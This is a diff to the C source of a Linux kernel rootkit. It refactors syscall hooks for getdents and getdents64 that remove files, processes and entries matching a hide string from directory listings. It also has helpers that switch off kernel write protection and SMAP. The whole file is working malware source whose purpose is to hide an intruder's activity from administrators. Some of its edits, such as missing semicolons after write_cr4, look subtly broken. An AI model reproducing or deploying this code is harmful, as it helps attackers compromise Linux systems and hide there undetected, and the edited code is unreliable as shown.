@@ -1,5 +1,6 @@
 #include <linux/version.h> // LINUX_VERSION_CODE
 #include <linux/syscalls.h> //__MAP, __SC_DECL, __NR_syscall
+#include <linux/types.h> //bool
 
 #include "config.h"
 #include "hooks.h"
@@ -13,6 +14,8 @@
 #define write_cr0(val) asm volatile("mov %0, %%cr0":"+r" (val), "+m" (__force_order));
 #define write_cr4(val) asm volatile("mov %0, %%cr4":"+r" (val));
 
+#undef DISABLE_SMAP
+
 void ENABLE_WRITE(void){
 	unsigned long val = read_cr0() & (~(1<<WP_BIT_IN_CR0));
 	write_cr0(val)
@@ -23,14 +26,14 @@ void DISABLE_WRITE(void){
 }
 void ENABLE_SMAP(void){
 	unsigned long val = native_read_cr4() | (1<<SMAP_BIT_IN_CR4);
-	write_cr4(val);
+	write_cr4(val)
 }
 void DISABLE_SMAP(void){
 	unsigned long val = native_read_cr4() & (~(1<<SMAP_BIT_IN_CR4));
-	write_cr4(val);
+	write_cr4(val)
 }
 bool IS_SMAP_ENABLED(void){
-	return (native_read_cr4() & (1<<SMAP_BIT_IN_CR4)) != 0;
+	return ((native_read_cr4() & (1<<SMAP_BIT_IN_CR4)) != 0);
 }
 
 
@@ -119,77 +122,44 @@ hook_define(1, long, sched_getscheduler, pid_t, pid)
 hook_define(2, long, sched_rr_get_interval, pid_t, pid, void __user *, interval)
 hook_define(2, long, kill, pid_t, pid, int, sig)
 
-asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user* dirent, unsigned int count, const struct pt_regs* regs) {
-	int buff_offset, deleted_size;
-	struct linux_dirent* currnt;
-	bool del;
-	unsigned long pid;
-	long ret;
-
-	ret = sys_getdents_orig(ARGS_ORIG(3, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count));
-
-	buff_offset = 0;
-	while (buff_offset < ret){
-		currnt = (struct linux_dirent*)((char*)dirent + buff_offset);
-		del = false;
-		if (strstr(currnt->d_name, HIDE_STR) != NULL)
-			del = true;
-
-		if (is_file_hidden(currnt->d_name))
-			del = true;
-		
-		// only if conversion to unsigned long succeeds
-		if (kstrtoul(currnt->d_name, 10, &pid) == 0 && is_pid_hidden(pid))
-			del = true;
-
-		if (del){
-			// Copies the rest of the buffer to the position of the current entry
-			deleted_size = currnt->d_reclen;
-			memcpy(currnt, (char*)currnt + currnt->d_reclen,  ret - buff_offset - currnt->d_reclen);
-			ret -= deleted_size;
-		} else
-			buff_offset += currnt->d_reclen;
-
-	}
-	return ret;
+#define sys_getdents_do_hook_define(v)                                                               \
+asmlinkage long sys_getdents##v##_do_hook(unsigned int fd, struct linux_dirent##v __user* dirent, unsigned int count, const struct pt_regs* regs) { \
+	int buff_offset, deleted_size;                                                                   \
+	struct linux_dirent##v* currnt;                                                                  \
+	bool del;                                                                                        \
+	unsigned long pid;                                                                               \
+	long ret;                                                                                        \
+\
+	ret = sys_getdents##v##_orig(ARGS_ORIG(3, unsigned int, fd, struct linux_dirent##v __user*, dirent, unsigned int, count)); \
+\
+	buff_offset = 0;                                                                                 \
+	while (buff_offset < ret){                                                                       \
+		currnt = (struct linux_dirent##v*)((char*)dirent + buff_offset);                             \
+		del = false;                                                                                 \
+		if (strstr(currnt->d_name, HIDE_STR) != NULL)                                                \
+			del = true;                                                                              \
+\
+		if (is_file_hidden(currnt->d_name))                                                          \
+			del = true;                                                                              \
+\
+		/* only if conversion to unsigned long succeeds */                                           \
+		if (kstrtoul(currnt->d_name, 10, &pid) == 0 && is_pid_hidden(pid))                           \
+			del = true;                                                                              \
+\
+		if (del){                                                                                    \
+			/* Copies the rest of the buffer to the position of the current entry */                 \
+			deleted_size = currnt->d_reclen;                                                         \
+			memcpy(currnt, (char*)currnt + currnt->d_reclen,  ret - buff_offset - currnt->d_reclen); \
+			ret -= deleted_size;                                                                     \
+		} else                                                                                       \
+			buff_offset += currnt->d_reclen;                                                         \
+\
+	}                                                                                                \
+	return ret;                                                                                      \
 }
 
-// COPY PASTE: YOU CAN DO IT BETTER
-asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __user* dirent, unsigned int count, const struct pt_regs* regs) {
-	int buff_offset, deleted_size;
-	struct linux_dirent64* currnt;
-	bool del;
-	unsigned long pid;
-	long ret;
-
-	ret = sys_getdents64_orig(ARGS_ORIG(3, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count));
-
-	buff_offset = 0;
-	while (buff_offset < ret){
-		currnt = (struct linux_dirent64*)((char*)dirent + buff_offset);
-		del = false;
-		if (strstr(currnt->d_name, HIDE_STR) != NULL)
-			del = true;
-
-		if (is_file_hidden(currnt->d_name))
-			del = true;
-		
-		// only if conversion to unsigned long succeeds
-		if (kstrtoul(currnt->d_name, 10, &pid) == 0 && is_pid_hidden(pid))
-			del = true;
-
-		if (del){
-			//log(KERN_INFO "ROOTKIT: sysgetdents trying to hide %s\n", currnt->d_name);
-			// Copies the rest of the buffer to the position of the current entry
-			deleted_size = currnt->d_reclen;
-			memcpy(currnt, (char*)currnt + currnt->d_reclen,  ret - buff_offset - currnt->d_reclen);
-			ret -= deleted_size;
-		} else
-			buff_offset += currnt->d_reclen;
-
-	}
-	return ret;
-}
+sys_getdents_do_hook_define()
+sys_getdents_do_hook_define(64)
 
 int check_pid_in_pathname(const char __user *pathname, const char* syscall_caller){
 	int pid;
